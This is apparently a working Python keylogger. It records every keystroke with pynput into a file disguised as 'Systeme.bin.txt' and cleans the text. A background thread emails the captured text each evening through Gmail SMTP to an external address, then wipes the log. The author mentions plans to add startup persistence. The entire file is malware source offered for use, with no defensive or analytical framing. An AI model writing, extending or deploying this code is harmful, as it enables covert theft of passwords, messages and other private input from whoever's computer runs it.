"""
setted by @housUnus

more functionalities

txt sended as string traited and clean

other futues may i will add run with system start up

"""




from pynput.keyboard import Key, Listener
import logging
import time
import threading
from threading import Thread
import smtplib
import datetime

sendedToday = False
#the path disired of your txt_keys file
log_dir = "d:\Systeme.bin.txt"
#to don't have a fine with a big size in future , we assure that after sending data clean the file
f = open(log_dir, 'w') 
f.close()

#main methode of email sender
def run():
    global sendedToday
    print(sendedToday)
    while True:
      t = datetime.datetime.today()
      future = datetime.datetime(t.year,t.month,t.day,21,0)
      #if t.hour ==00 and t.minute <12 or t.hour ==00 :
      if t.hour == 21:
          sendedToday = False
          send()
          if sendedToday == True:
              future += datetime.timedelta(days=1)
              #future = datetime.datetime(t.year,t.month,t.day,,0)
              print((future - t).seconds)
              f = open(log_dir, 'w') 
              f.close()
              time.sleep((future - t).seconds)

#the process of send the msg
def send():
  global sendedToday
  try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("email to send from", "PASSWORD")
    server.sendmail("email to send from", "email to send to it", link())
    server.quit()
    sendedToday = True
    return
  except :
    sendedToday = False
    return
#try link each carachter in each line in one string
def link():
    f = open('d:\Systeme.bin.txt', 'r+')
    buffer = f.read()
    f.close()
    #save only the carachter and some special charachter
    msg = (buffer.replace("'","").replace("\n","").replace("Key.space"," ").replace("Key.caps_lock","^")
           .replace("Key.ctrl_l","*").replace("Key.backspace","<").replace("Key.right","").replace("Key.left","")
           .replace("Key.shift","").replace("Key.enter","").replace("Key.alt_r","+"))
    print(msg)
    msg = Upper(msg)
    msg = backD(msg)
    return msg
#remove the if the key saved was delete
def backD(msg):
    la = [x for x in msg]
    for j in range(len(la)) :
            for i in range(len(la)) :
                    if la[i] =='<':
                            bef = i-1   
                            la.pop(i)
                            la.pop(bef)
                            break
    return "".join(la)
#make the carachter after the KeyLock as Upper its not so efficient
def Upper(msg):
    la = [x for x in msg]
    count =1
    for j in range(len(la)) :
            count=1
            for i in range(len(la)) :
                    if la[i] =='^':
                           
                               print(la[i])
                               print(la[i-1])
                               bef = i-1
                               la[bef] = la[bef].upper()
                               la.pop(i)
                               break
    return "".join(la)

#start the run methode separatley to don't use more time and memories while sending and typing
Thread(target = run ).start()

# keystroke region
logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(message)s')    
#main function get the key and saved in a fine 
def on_press(key):
    
    
     #Email.run()
     logging.info(str(key))
    
with Listener(on_press=on_press) as listener:
    listener.join()
time.sleep(15)


